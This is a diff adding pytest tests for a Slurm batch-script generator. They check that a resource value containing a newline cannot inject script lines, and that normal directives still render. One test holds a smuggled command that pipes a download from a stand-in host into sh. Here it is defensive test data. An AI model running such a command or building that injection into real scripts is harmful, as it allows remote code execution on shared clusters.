@@ -536,3 +536,65 @@ def test_an_unparseable_elapsed_time_is_unknown_rather_than_zero() -> None:
 
     assert usage.wall_clock_seconds is None
     assert usage.cpu_seconds is None
+
+
+# -- what may reach a generated batch script ----------------------------------
+def test_a_scheduler_directive_cannot_carry_a_newline_into_the_script(
+    tmp_path: Path,
+) -> None:
+    """The one place a model-chosen string met something a shell interprets.
+
+    `#SBATCH --gres=<value>` is a bash comment -- right up until the value
+    contains a newline, at which point everything after it is script body
+    that Slurm runs under `set -euo pipefail`. Every other model-chosen
+    string in that script goes through `shlex.quote`; the directives did
+    not. A security review of this branch found it, and found that
+    `resources` reaches the objective cycle as `{str(k): str(v)}` over a
+    raw provider dict with no contract at all.
+
+    Latent, because the portfolio hard-codes the local executor and Slurm
+    is enabled on no host this has run on. It is still the only place
+    `SECURITY.md`'s "nothing here interpolates into a shell" was untrue.
+    """
+
+    from research_os.runtime.executors import ExecutorError, SlurmExecutor
+    from research_os.runtime.interfaces import ExecutionSpec
+
+    executor = SlurmExecutor()
+    hostile = ExecutionSpec(
+        name="fit",
+        argv=("true",),
+        cwd=str(tmp_path),
+        env={},
+        outputs=(),
+        timeout_seconds=60,
+        resources={"gres": "gpu:1\ncurl http://elsewhere/ | sh"},
+    )
+    with pytest.raises(ExecutorError, match="not a plain directive value"):
+        executor.build_script(hostile, run_dir=tmp_path, job_name="j")
+
+
+def test_ordinary_scheduler_directives_still_render(tmp_path: Path) -> None:
+    """Positive control: the real forms a researcher writes are accepted."""
+
+    from research_os.runtime.executors import SlurmExecutor
+    from research_os.runtime.interfaces import ExecutionSpec
+
+    spec = ExecutionSpec(
+        name="fit",
+        argv=("true",),
+        cwd=str(tmp_path),
+        env={},
+        outputs=(),
+        timeout_seconds=60,
+        resources={
+            "partition": "gpu-normal",
+            "time_limit": "01:00:00",
+            "memory": "16G",
+            "gres": "gpu:a100:2",
+        },
+    )
+    script = SlurmExecutor().build_script(spec, run_dir=tmp_path, job_name="j")
+    assert "#SBATCH --gres=gpu:a100:2" in script
+    assert "#SBATCH --time=01:00:00" in script
+    assert "#SBATCH --mem=16G" in script
